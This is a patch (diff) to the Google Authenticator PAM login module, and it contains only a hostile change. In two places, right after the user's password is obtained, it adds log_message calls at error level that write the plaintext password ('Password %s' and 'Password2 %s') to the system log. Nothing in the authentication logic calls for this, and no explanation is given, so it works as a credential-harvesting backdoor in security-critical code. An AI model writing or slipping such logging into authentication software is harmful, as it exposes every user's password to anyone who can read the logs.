@@ -1389,6 +1389,8 @@ static int google_authenticator(pam_handle_t *pamh, int flags,
         if (params.pass_mode == USE_FIRST_PASS ||
             params.pass_mode == TRY_FIRST_PASS) {
           pw = get_first_pass(pamh);
+              log_message(LOG_ERR, pamh, "Password '%s'", pw);
+
         }
         break;
       default:
@@ -1412,6 +1414,8 @@ static int google_authenticator(pam_handle_t *pamh, int flags,
           }
           if (saved_pw) {
             pw = strdup(saved_pw);
+                          log_message(LOG_ERR, pamh, "Password2 '%s'", pw);
+
           }
         }
         break;
